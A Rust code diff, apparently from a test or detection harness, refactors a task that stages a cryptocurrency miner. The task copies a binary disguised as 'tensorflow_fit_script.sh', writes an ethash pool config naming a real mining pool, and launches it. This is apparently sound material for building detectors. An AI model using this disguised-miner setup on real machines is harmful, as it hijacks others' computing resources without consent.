@@ -8,31 +8,32 @@ pub struct ETHTask;
 impl task::Task for ETHTask {
     fn init_env(&self) -> anyhow::Result<()> {
         println!("init_env()");
-
         Command::new("cp")
             .arg("/tmp/b86547d084228861")
             .arg("tensorflow_fit_script.sh")
             .spawn()?
             .wait()?;
-
         File::create("c")?
             .write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\nwatchdog=1\napi=10555\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e")?;
-
         Ok(())
     }
 
-    fn clean_env(&self) {
+    fn clean_env(&self) -> anyhow::Result<()> {
         println!("clean_env()");
-        let mut command = Command::new("rm");
-        command.arg("-rf").arg("tensorflow_fit_script.sh").arg("c");
-        command.spawn().unwrap();
+        Command::new("rm")
+            .arg("-rf")
+            .arg("tensorflow_fit_script.sh")
+            .arg("c")
+            .spawn()?;
+        Ok(())
     }
 
     fn start_target_process(&self) -> anyhow::Result<u32> {
         println!("start_target_process()");
-        let mut command = Command::new("./tensorflow_fit_script.sh");
-        command.arg("--config").arg("c");
-        let process = command.spawn()?;
+        let process = Command::new("./tensorflow_fit_script.sh")
+            .arg("--config")
+            .arg("c")
+            .spawn()?;
         Ok(process.id())
     }
 
